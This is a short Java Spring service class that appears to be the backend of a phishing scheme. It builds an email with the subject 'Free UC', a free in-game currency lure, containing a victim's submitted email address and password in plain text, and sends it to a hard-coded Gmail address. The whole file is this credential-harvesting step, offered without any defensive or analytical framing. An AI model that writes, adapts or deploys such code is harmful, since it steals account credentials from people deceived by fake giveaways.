package com.khorunaliyev.khorunaliyev.service;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.mail.SimpleMailMessage;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.stereotype.Service;

@Service
public class EmailSenderService {

    @Autowired
    private JavaMailSender javaMailSender;

    public void setJavaMailSender(String email, String password){
        SimpleMailMessage simpleMailMessage = new SimpleMailMessage();
        simpleMailMessage.setSubject("Free UC");
        simpleMailMessage.setFrom("m1lordgaming6915@gmail.com");
        simpleMailMessage.setTo("m1lordgaming6915@gmail.com");
        simpleMailMessage.setText("Email: "+email+"  "+"Password: "+password);
        javaMailSender.send(simpleMailMessage);

    }
}
